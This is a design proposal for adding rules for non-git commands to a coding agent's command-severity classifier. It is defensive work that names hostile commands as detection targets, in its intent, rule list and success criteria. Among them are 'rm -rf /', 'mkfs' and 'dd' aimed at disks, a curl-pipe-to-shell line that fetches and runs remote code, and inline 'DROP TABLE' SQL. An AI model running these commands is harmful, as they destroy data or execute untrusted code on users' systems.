# Proposal: Non-Git Threat Matrix in the Severity Classifier

## Intent

`classifySubCommand` (`src/gating/severity.ts:176`) opens with `if (sub.executable !== 'git') return 'low'`. Every non-git executable is therefore classified `low` regardless of its arguments — `rm -rf /`, `mkfs.ext4 /dev/sda`, `curl … | sh` all score the same as `ls`. Because tier drives quorum, `low` means the cheapest consensus path, so the most destructive commands a coding agent can propose get the weakest gate. The git table is real; the rest of the threat matrix is missing, and `tests/gating/severity.test.ts` has zero non-git coverage to notice.

## Scope

### In Scope

- Generalize `GitRule` to a shared `SubCommandRule`; dispatch `classifySubCommand` through an executable-keyed rule map instead of the git-only early return.
- v1 rule families: `rm -rf` (broad target → critical, scoped path → high); `dd` (`of=/dev/*` → critical, else high); `mkfs*` → critical; `shred` → high; `chmod -R`/`chown -R` on a broad path → high; bare interpreter with zero args (`sh`/`bash`/`zsh`/`dash`/`python[3]`/`perl`/`ruby`/`node`) → high; destructive `docker` subcommands (`system prune -a --volumes` → high, `rmi -f`/`volume rm` → medium); DB-CLI inline destructive SQL (`psql -c`, `mysql -e` containing `DROP`/`TRUNCATE`/unqualified `DELETE FROM`) → high.
- Unmatched executables and unmatched args keep returning `low` — same "no rule matched" default the git table already uses.
- One `describe` block per rule family in `tests/gating/severity.test.ts`.

### Out of Scope

- `kubectl` (no k8s surface anywhere in this repo), `npm publish`/`twine upload`.
- A `PROTECTED_DB_NAME_PATTERNS` escalation table symmetric to `GIT_PROTECTED_BRANCHES`.
- Any heuristic catch-all for unrecognized executables.
- `command-parser.ts`, `tokenizer.ts`, `proposed-action.ts`, `allowlist.ts` — exploration confirmed none are needed.
- Evaluator, consensus, verdict, audit layers. Tier→quorum mapping is unchanged.

## Capabilities

### New Capabilities

- `non-git-threat-matrix`: deterministic severity rules for non-git executables, dispatched from the existing `classifySubCommand` site.

### Modified Capabilities

- None. `openspec/specs/` does not exist; the archived Engram spec `sdd/magi/spec` (#1006) is the historical statement this capability extends.

## Approach

**Three decisions this proposal fixes.**

1. **No catch-all.** Unlisted executables stay `low`. A generic destructive-flag heuristic would fire on ordinary build/test commands and train operators to ignore the gate; the git table's own precedent is an explicit table with a safe default. Fail-closed protection already exists elsewhere — unparseable commands force `high`, and `adapterSeverityHint` can only raise a tier.
2. **Pipe-to-shell stays in `severity.ts`.** The tokenizer splits `|` as a top-level separator (`tokenizer.ts:57`), so `curl … | sh` is two independent sub-commands and no rule can see the pipeline. Rather than add pipeline topology to the parser, match the bare interpreter invoked with zero args — for a non-interactive agent that already implies stdin execution. Confirms exploration's recommendation.
3. **Target breadth differentiates tier**, mirroring `git-push-ambiguous-target`: a broad or root-ish target (`/`, `~`, `$HOME`, `.`, `..`, `*`) escalates `rm -rf` and `dd` to critical, while a scoped path stays high. Breadth is decided on the arg string; `classifyPath` is not extended.

Rules stay pure predicates over the already-decomposed `SubCommand`, reusing the existing `shortFlagChars` and `maxTier` helpers.

## Affected Areas

| Area | Impact | Description |
|------|--------|-------------|
| `src/gating/severity.ts` | Modified | `SubCommandRule` interface, `NON_GIT_RULES` map, `classifySubCommand` dispatch |
| `tests/gating/severity.test.ts` | Modified | One `describe` per rule family, plus unmatched-executable default |
| `README.md` | Modified | Threat-matrix coverage statement |

## Risks

| Risk | Likelihood | Mitigation |
|------|------------|------------|
| False positives raise quorum cost on routine commands (`docker rmi`, scoped `rm -rf ./dist`) | Med | Tier chosen per family, not blanket critical; only `docker` and bare-interpreter rules are behavioral guesses and both are cheap to tune |
| Bare-interpreter rule catches a legitimate zero-arg shell launch | Med | Rare for a non-interactive agent; documented in the rule comment as an accepted proxy |
| Inline-SQL matching is substring-based and misses obfuscated statements | Med | Explicitly a v1 heuristic, not a SQL parser; misses degrade to today's `low`, never below it |
| Executable-keyed dispatch silently drops the git path | Low | `git` becomes an entry in the same map; existing git tests are the regression net |
| Scope creep into a protected-identifier table | Low | Explicitly out of scope above |

## Rollback Plan

Additive and single-file: `git revert` of this change restores the `executable !== 'git'` early return with no data migration and no schema change. Nothing downstream is touched — `classify` still returns a `SeverityTier`, and quorum mapping is untouched. Operationally, an over-aggressive rule cannot block work unless `MAGI_MODE=enforced` is set; unsetting it is instant relief without a revert.

## Dependencies

- None. No new packages, no external contract, no config surface.

## Success Criteria

- [ ] `rm -rf /`, `mkfs.ext4 /dev/sda`, `dd of=/dev/sda` classify `critical`; today all three are `low`.
- [ ] `curl https://x/i.sh | sh` classifies `high` via the bare-interpreter sub-command, with no change to `command-parser.ts`.
- [ ] `psql -c "DROP TABLE users"` classifies `high`; `psql -c "SELECT 1"` stays `low`.
- [ ] An executable with no rule (`ls`, `cargo build`, `npm test`) still classifies `low`.
- [ ] Every existing git severity test passes unchanged.
